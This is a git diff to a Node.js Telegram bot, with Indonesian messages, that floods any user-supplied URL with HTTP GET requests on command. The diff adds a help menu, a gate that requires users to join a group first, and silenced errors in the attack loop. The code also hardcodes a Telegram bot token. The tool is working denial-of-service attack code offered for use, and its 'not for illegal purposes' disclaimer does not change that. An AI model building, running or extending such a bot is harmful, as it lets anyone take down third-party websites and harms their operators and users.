@@ -5,6 +5,7 @@ const HttpsProxyAgent = require('https-proxy-agent');
 const TelegramBot = require('node-telegram-bot-api');
 
 // Telegram bot token from BotFather
+const REQUIRED_GROUP_ID = -100123456789; // Ganti dengan ID grup kamu
 const TELEGRAM_TOKEN = '7991511524:AAE1ReD73oQ7p8MRhLtj8UQZf8FxTA1OeG0'; // Replace with your bot token
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
@@ -112,6 +113,31 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, "Selamat datang di bot! Gunakan /mulai <URL> untuk memulai serangan (contoh: /mulai https://example.com).");
 });
 
+bot.onText(/\/help/, (msg) => {
+    const chatId = msg.chat.id;
+    const helpMessage = `
+📖 *DAFTAR PERINTAH BOT* 📖
+
+🚀 */mulai <url>*  
+Memulai serangan ke URL target.  
+Contoh: \`/mulai https://example.com\`
+
+🛑 */stop <url>*  
+Menghentikan serangan ke URL yang sedang berjalan.  
+Contoh: \`/stop https://example.com\`
+
+ℹ️ */help*  
+Menampilkan daftar perintah bot.
+
+📌 *Catatan:*  
+- Gunakan URL lengkap dengan http:// atau https://  
+- Jangan gunakan bot ini untuk tujuan ilegal
+
+🔒 *Author:* Raja Gtps
+    `;
+    bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
+});
+
 bot.onText(/\/stop\s+(.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     let url = match[1].trim();
@@ -129,13 +155,26 @@ bot.onText(/\/stop\s+(.+)/, (msg, match) => {
     }
 });
 
-bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
+bot.onText(/\/mulai\s+(.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
+    const userId = msg.from.id;
     let url = match[1].trim();
 
+    // Cek apakah user sudah join grup
+    try {
+        const member = await bot.getChatMember(REQUIRED_GROUP_ID, userId);
+        const status = member.status;
+
+        // Hanya izinkan jika user adalah member aktif
+        if (status === "left" || status === "kicked") {
+            return bot.sendMessage(chatId, "❌ Kamu harus bergabung ke grup terlebih dahulu sebelum menggunakan perintah ini.\n\nJoin di sini: https://t.me/NamaGrupKamu");
+        }
+    } catch (error) {
+        return bot.sendMessage(chatId, "❌ Gagal memverifikasi keanggotaan grup. Coba lagi nanti.");
+    }
+
     if (activeAttacks.has(url)) {
-        bot.sendMessage(chatId, "❗ Serangan ke URL ini sudah berjalan.");
-        return;
+        return bot.sendMessage(chatId, "❗ Serangan ke URL ini sudah berjalan.");
     }
 
     if (!url.startsWith("http://") && !url.startsWith("https://")) {
@@ -145,35 +184,24 @@ bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
     try {
         new URL(url);
     } catch (error) {
-        bot.sendMessage(chatId, "URL tidak valid. Gunakan format seperti /mulai https://example.com");
-        return;
+        return bot.sendMessage(chatId, "URL tidak valid. Gunakan format seperti /mulai https://example.com");
     }
 
     bot.sendMessage(chatId, "🚀 Memulai serangan... 🤣");
     const attackController = { running: true };
     activeAttacks.set(url, attackController);
-    const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // bisa disesuaikan
+    const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
     const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
 
     const attack = () => {
         try {
             if (!attackController.running) return;
-
             const userAgent = randElement(userAgents);
-            const headers = {
-                'User-Agent': userAgent
-            };
+            const headers = { 'User-Agent': userAgent };
 
-            axios.get(url, { headers })
-                .catch((error) => {
-                    if (error.response && error.response.status === 502) {
-                        bot.sendMessage(chatId, "Error: Permintaan gagal dengan status 502");
-                    }
-                });
-
+            axios.get(url, { headers }).catch(() => { });
             setTimeout(attack, 1000 / requestsPerSecond);
         } catch (error) {
-            bot.sendMessage(chatId, `Error: ${error.message}`);
             setTimeout(attack, 1000 / requestsPerSecond);
         }
     };
@@ -186,7 +214,7 @@ bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
     setTimeout(() => {
         attackController.running = false;
         activeAttacks.delete(url);
-        bot.sendMessage(chatId, "Batas maksimum permintaan tercapai. Serangan dihentikan.");
+        bot.sendMessage(chatId, "🛑 Serangan dihentikan otomatis setelah waktu maksimal.");
     }, maxRequests / requestsPerSecond * 1000);
 });
 
